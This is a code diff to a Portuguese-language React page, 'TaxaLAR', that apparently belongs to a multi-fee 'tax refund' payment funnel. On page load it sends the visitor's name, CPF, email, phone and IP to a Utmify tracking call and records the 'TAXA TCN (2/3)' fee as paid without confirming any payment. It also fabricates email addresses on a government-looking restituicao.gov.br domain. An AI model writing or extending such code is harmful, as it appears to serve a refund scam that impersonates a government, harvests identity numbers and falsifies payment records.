@@ -120,6 +120,41 @@ export default function TaxaLAR() {
     });
   }, [userData, updateUserData]);
   
+  // Efeito para registrar o evento de PAID da TCN quando o usuário acessa esta página
+  useEffect(() => {
+    const dispararEventoPagamentoTCN = async () => {
+      try {
+        // Verificar se temos os dados mínimos necessários
+        if (userData.nome && userData.cpf) {
+          console.log('[Utmify] Registrando evento de PAID da TAXA TCN (2/3)');
+          
+          // Montar objeto com dados do usuário
+          const dadosUsuario = {
+            nome: userData.nome,
+            cpf: userData.cpf,
+            email: userData.email || `${userData.cpf.substring(0, 3)}xxx${userData.cpf.substring(userData.cpf.length-2)}@restituicao.gov.br`,
+            telefone: userData.telefone || "(11) 99999-9999",
+            ip: userData.ip || "127.0.0.1"
+          };
+          
+          // Registrar evento de PAID para a TAXA TCN (2/3)
+          const response = await registerTCNPayment(dadosUsuario, 'paid', userData.pagamentoId);
+          
+          if (response.success) {
+            console.log('[Utmify] Evento de PAID da TAXA TCN registrado com sucesso:', response.data);
+          } else {
+            console.error('[Utmify] Erro ao registrar evento de PAID da TAXA TCN:', response.error);
+          }
+        }
+      } catch (error) {
+        console.error('[Utmify] Erro ao registrar evento de PAID da TAXA TCN:', error);
+      }
+    };
+    
+    // Executar a função para registrar o pagamento
+    dispararEventoPagamentoTCN();
+  }, []); // Executar apenas uma vez quando a página carregar
+  
   // Função para prosseguir para a página de pagamento da LAR
   const prosseguirParaPagamentoLAR = () => {
     // Atualizar contexto com dados adicionais necessários para a próxima etapa
